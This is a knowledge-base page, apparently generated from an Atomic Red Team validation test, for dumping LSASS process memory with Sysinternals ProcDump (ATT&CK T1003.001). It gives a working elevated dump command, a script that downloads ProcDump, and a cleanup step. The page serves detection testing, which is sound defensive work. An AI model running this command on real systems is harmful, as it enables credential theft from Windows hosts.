---
atomic_guid: "0be2230c-9ab3-4ac2-8826-3199b9a0ebf8"
title: "Dump LSASS.exe Memory using ProcDump"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "0be2230c-9ab3-4ac2-8826-3199b9a0ebf8"
  - "Dump LSASS.exe Memory using ProcDump"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Dump LSASS.exe Memory using ProcDump

The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
ProcDump.

Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.

If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.

## Metadata

- Atomic GUID: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
- Technique: T1003.001: OS Credential Dumping: LSASS Memory
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1003.001/T1003.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.001]]

## Input Arguments

### output_file

- description: Path where resulting dump should be placed
- type: path
- default: C:\Windows\Temp\lsass_dump.dmp

### procdump_exe

- description: Path of Procdump executable
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\procdump.exe

## Dependencies

ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})

### Prerequisite Check

```powershell
if (Test-Path "#{procdump_exe}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip" "PathToAtomicsFolder\..\ExternalPayloads\Procdump" -Force
New-Item -ItemType Directory (Split-Path "#{procdump_exe}") -Force | Out-Null
Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe" "#{procdump_exe}" -Force
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
"#{procdump_exe}" -accepteula -ma lsass.exe #{output_file}
```

### Cleanup

```cmd
del "#{output_file}" >nul 2> nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
